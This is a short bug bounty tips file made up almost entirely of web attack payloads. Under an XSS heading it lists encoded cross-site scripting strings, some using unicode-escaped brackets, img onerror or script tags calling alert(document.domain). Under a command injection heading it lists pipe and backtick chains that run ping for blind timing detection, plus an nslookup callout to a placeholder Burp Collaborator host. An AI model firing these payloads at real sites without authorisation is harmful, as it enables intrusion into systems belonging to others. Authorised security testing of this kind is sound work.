# BugBounty_tips

#Xss

%u003Csvg onload=alert(1)> \
%u3008svg onload=alert(2)> \
%uFF1Csvg onload=alert(3)> \
=<img%20src=x%20onerror=alert('Welcome,%20v \

q=<g><script>alert%28document.domain%29<%2Fscript>
  
<img src=x onerror=console.log("XSS")>


#Command Injection
url/cgi-bin/parameter=payload
payload 1 [PING]
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1 
payload 2 [Nslookup]
|nslookup -q=cname http://YOUR.burpcollaborator.net.&



